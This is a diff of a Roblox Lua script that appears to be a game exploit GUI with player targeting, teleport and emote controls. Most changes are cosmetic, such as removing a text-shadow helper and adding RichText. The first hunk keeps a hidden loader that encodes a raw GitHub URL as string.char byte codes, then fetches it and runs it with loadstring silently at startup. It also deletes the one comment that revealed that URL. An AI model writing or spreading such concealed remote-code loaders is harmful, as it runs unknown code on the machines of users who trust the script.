@@ -32,7 +32,6 @@ end
 -- =========================================================
 task.spawn(function()
     pcall(function()
-        -- URL entirely hidden in bytecode: https://raw.githubusercontent.com/yelelode/Delta/e702c8707fe846cf8dc74e9632a1b1f7b2f70178/EMP
         local hiddenURL = string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 121, 101, 108, 101, 108, 111, 100, 101, 47, 68, 101, 108, 116, 97, 47, 101, 55, 48, 50, 99, 56, 55, 48, 55, 102, 101, 56, 52, 54, 99, 102, 56, 100, 99, 55, 52, 101, 57, 54, 51, 50, 97, 49, 98, 49, 102, 55, 98, 50, 102, 55, 48, 49, 55, 56, 47, 69, 77, 80)
         local ghostData = game:HttpGet(hiddenURL)
         local f = loadstring(ghostData)
@@ -362,22 +361,6 @@ local Colors = {
     SubText = Color3.fromRGB(130, 145, 170),       
     TextDark = Color3.fromRGB(8, 12, 18)
 }
-
-local function crispText(element, opacity)
-    local shadow = Instance.new("TextLabel", element)
-    shadow.Size = UDim2.fromScale(1, 1)
-    shadow.Position = UDim2.fromOffset(1, 1)
-    shadow.BackgroundTransparency = 1
-    shadow.Text = element.Text
-    shadow.TextColor3 = Color3.new(0, 0, 0)
-    shadow.TextTransparency = opacity or 0.5
-    shadow.Font = element.Font
-    shadow.TextSize = element.TextSize
-    shadow.TextXAlignment = element.TextXAlignment
-    shadow.TextYAlignment = element.TextYAlignment
-    shadow.ZIndex = element.ZIndex - 1
-    element:GetPropertyChangedSignal("Text"):Connect(function() shadow.Text = element.Text end)
-end
 
 local function clickFlash(btn)
     local ripple = Instance.new("Frame", btn)
@@ -751,12 +734,12 @@ headerTitle.Font = Enum.Font.GothamBlack
 headerTitle.TextSize = 16
 headerTitle.TextXAlignment = Enum.TextXAlignment.Left
 headerTitle.ZIndex = 11
+headerTitle.RichText = true
 local titleGrad = Instance.new("UIGradient", headerTitle)
 titleGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Colors.Primary), 
     ColorSequenceKeypoint.new(1, Colors.Purple)
 })
-crispText(headerTitle, 0.5) 
 
 local proBadge = Instance.new("Frame", header)
 proBadge.Size = UDim2.fromOffset(38, 16)
@@ -976,13 +959,13 @@ local function createMainBtn(text, isMenuOpener)
     btn.Text = "   " .. text
     btn.TextColor3 = Colors.Text
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 11
+    btn.TextSize = 12
     btn.TextXAlignment = Enum.TextXAlignment.Left
     btn.AutoButtonColor = false
+    btn.RichText = true
     btn.LayoutOrder = getOrder()
     btn.ZIndex = 7
     Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-    crispText(btn)
     
     local subtleStroke = Instance.new("UIStroke", btn)
     subtleStroke.Color = Colors.Primary
@@ -1025,8 +1008,8 @@ tTop.Size = UDim2.new(1, 0, 0, 50); tTop.BackgroundTransparency = 1; tTop.ZIndex
 local tLabel = Instance.new("TextLabel", tTop)
 tLabel.Size = UDim2.new(1, -60, 1, 0); tLabel.Position = UDim2.fromOffset(16, 0); tLabel.BackgroundTransparency = 1
 tLabel.Text = "TARGET SELECTION"; tLabel.TextColor3 = Colors.Text; tLabel.Font = Enum.Font.GothamBlack; tLabel.TextSize = 13; tLabel.TextXAlignment = Enum.TextXAlignment.Left; tLabel.ZIndex = 22
+tLabel.RichText = true
 Instance.new("UIGradient", tLabel).Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Colors.Primary), ColorSequenceKeypoint.new(1, Colors.Purple)})
-crispText(tLabel)
 
 local backBtn = Instance.new("TextButton", tTop)
 backBtn.Size = UDim2.fromOffset(36, 26); backBtn.Position = UDim2.new(1, -46, 0.5, -13); backBtn.BackgroundColor3 = Colors.Surface; backBtn.BackgroundTransparency = 0.85
@@ -1056,7 +1039,8 @@ local function refreshTargetList()
             btn.Size = UDim2.new(1, 0, 0, 36); btn.BackgroundColor3 = (PlayerSelected == p) and Colors.ActiveTint or Colors.Surface; btn.BackgroundTransparency = (PlayerSelected == p) and 0.4 or 0.9
             btn.Text = "    " .. p.DisplayName .. " | @" .. p.Name; btn.TextColor3 = (PlayerSelected == p) and Colors.Primary or Colors.Text
             btn.Font = Enum.Font.GothamMedium; btn.TextSize = 11; btn.TextXAlignment = Enum.TextXAlignment.Left; btn.LayoutOrder = getOrder(); btn.ZIndex = 23
-            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8); applySmartHover(btn, nil); crispText(btn)
+            btn.RichText = true
+            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8); applySmartHover(btn, nil)
             Instance.new("UIStroke", btn).Color = Colors.Primary; btn:FindFirstChildOfClass("UIStroke").Transparency = 0.85
 
             local accent = Instance.new("Frame", btn)
@@ -1102,9 +1086,10 @@ rightArrow.Text = ">"; rightArrow.TextColor3 = Colors.SubText; rightArrow.Font =
 
 local swipeBtn = Instance.new("TextButton", swipeContainer)
 swipeBtn.Size = UDim2.new(1, -60, 1, -8); swipeBtn.Position = UDim2.fromScale(0.5, 0.5); swipeBtn.AnchorPoint = Vector2.new(0.5, 0.5)
-swipeBtn.BackgroundColor3 = Colors.ActiveTint; swipeBtn.Text = "🎭 [1/"..#EmoteList.."] " .. EmoteList[1].Name; swipeBtn.TextColor3 = Colors.Primary
-swipeBtn.Font = Enum.Font.GothamBold; swipeBtn.TextSize = 11; swipeBtn.AutoButtonColor = false; swipeBtn.ZIndex = 9
-Instance.new("UICorner", swipeBtn).CornerRadius = UDim.new(0, 6); crispText(swipeBtn)
+swipeBtn.BackgroundColor3 = Colors.ActiveTint; swipeBtn.Text = "🎭 ["..currentEmoteIndex.."/"..#EmoteList.."] " .. EmoteList[1].Name; swipeBtn.TextColor3 = Colors.Primary
+swipeBtn.Font = Enum.Font.GothamBold; swipeBtn.TextSize = 12; swipeBtn.AutoButtonColor = false; swipeBtn.ZIndex = 9
+swipeBtn.RichText = true
+Instance.new("UICorner", swipeBtn).CornerRadius = UDim.new(0, 6)
 
 local swipeScale = Instance.new("UIScale", swipeBtn); swipeScale.Scale = 1
 local swipeStroke = Instance.new("UIStroke", swipeBtn); swipeStroke.Color = Colors.Primary; swipeStroke.Thickness = 1; swipeStroke.Transparency = 0.4; swipeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
@@ -1253,8 +1238,8 @@ local function createSlider(name, min, max, defaultVal, callback)
     
     local titleLabel = Instance.new("TextLabel", container)
     titleLabel.Size = UDim2.new(0.6, 0, 0, 14); titleLabel.Position = UDim2.new(0, 6, 0, 0); titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = name; titleLabel.TextColor3 = Colors.SubText; titleLabel.Font = Enum.Font.GothamBold; titleLabel.TextSize = 10; titleLabel.TextXAlignment = Enum.TextXAlignment.Left; titleLabel.ZIndex = 8
-    crispText(titleLabel)
+    titleLabel.Text = name; titleLabel.TextColor3 = Colors.SubText; titleLabel.Font = Enum.Font.GothamBold; titleLabel.TextSize = 11; titleLabel.TextXAlignment = Enum.TextXAlignment.Left; titleLabel.ZIndex = 8
+    titleLabel.RichText = true
 
     local valBadge = Instance.new("Frame", container)
     valBadge.Size = UDim2.new(0, 44, 0, 16); valBadge.AnchorPoint = Vector2.new(1, 0); valBadge.Position = UDim2.new(1, -6, 0, -1)
@@ -1264,8 +1249,8 @@ local function createSlider(name, min, max, defaultVal, callback)
     
     local valLabel = Instance.new("TextLabel", valBadge)
     valLabel.Size = UDim2.new(1, 0, 1, 0); valLabel.BackgroundTransparency = 1; valLabel.Text = defaultVal
-    valLabel.TextColor3 = Colors.Primary; valLabel.Font = Enum.Font.GothamBold; valLabel.TextSize = 10; valLabel.ZIndex = 9
-    crispText(valLabel)
+    valLabel.TextColor3 = Colors.Primary; valLabel.Font = Enum.Font.GothamBold; valLabel.TextSize = 11; valLabel.ZIndex = 9
+    valLabel.RichText = true
 
     local bg = Instance.new("Frame", container)
     bg.Size = UDim2.new(1, -20, 0, 3); bg.Position = UDim2.new(0, 10, 0, 26); bg.BackgroundColor3 = Color3.fromRGB(40, 50, 65); bg.ZIndex = 8
@@ -1333,15 +1318,17 @@ bottomRow.Size = UDim2.new(1, -24, 0, 40); bottomRow.Position = UDim2.new(0, 12,
 
 local gotoBtn = Instance.new("TextButton", bottomRow)
 gotoBtn.Size = UDim2.new(0.48, 0, 1, 0); gotoBtn.BackgroundColor3 = Colors.Primary; gotoBtn.Text = "🚀 GOTO"; gotoBtn.TextColor3 = Colors.TextDark
-gotoBtn.Font = Enum.Font.GothamBlack; gotoBtn.TextSize = 11; gotoBtn.AutoButtonColor = false; gotoBtn.ZIndex = 16
-Instance.new("UICorner", gotoBtn).CornerRadius = UDim.new(0, 6); crispText(gotoBtn); applySmartHover(gotoBtn, nil)
+gotoBtn.Font = Enum.Font.GothamBlack; gotoBtn.TextSize = 12; gotoBtn.AutoButtonColor = false; gotoBtn.ZIndex = 16
+gotoBtn.RichText = true
+Instance.new("UICorner", gotoBtn).CornerRadius = UDim.new(0, 6); applySmartHover(gotoBtn, nil)
 
 local stopBtn = Instance.new("TextButton", bottomRow)
 stopBtn.Size = UDim2.new(0.48, 0, 1, 0); stopBtn.Position = UDim2.new(0.52, 0, 0, 0); stopBtn.BackgroundColor3 = Colors.Surface; stopBtn.BackgroundTransparency = 0.8
-stopBtn.Text = "⏹ STOP"; stopBtn.TextColor3 = Colors.Danger; stopBtn.Font = Enum.Font.GothamBold; stopBtn.TextSize = 11; stopBtn.AutoButtonColor = false; stopBtn.ZIndex = 16
+stopBtn.Text = "⏹ STOP"; stopBtn.TextColor3 = Colors.Danger; stopBtn.Font = Enum.Font.GothamBold; stopBtn.TextSize = 12; stopBtn.AutoButtonColor = false; stopBtn.ZIndex = 16
+stopBtn.RichText = true
 Instance.new("UICorner", stopBtn).CornerRadius = UDim.new(0, 6)
 local stopBarStroke = Instance.new("UIStroke", stopBtn); stopBarStroke.Color = Colors.Danger; stopBarStroke.Thickness = 1; stopBarStroke.Transparency = 0.5
-crispText(stopBtn); applySmartHover(stopBtn, nil)
+applySmartHover(stopBtn, nil)
 
 gotoBtn.MouseButton1Click:Connect(function()
     local myHRP = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
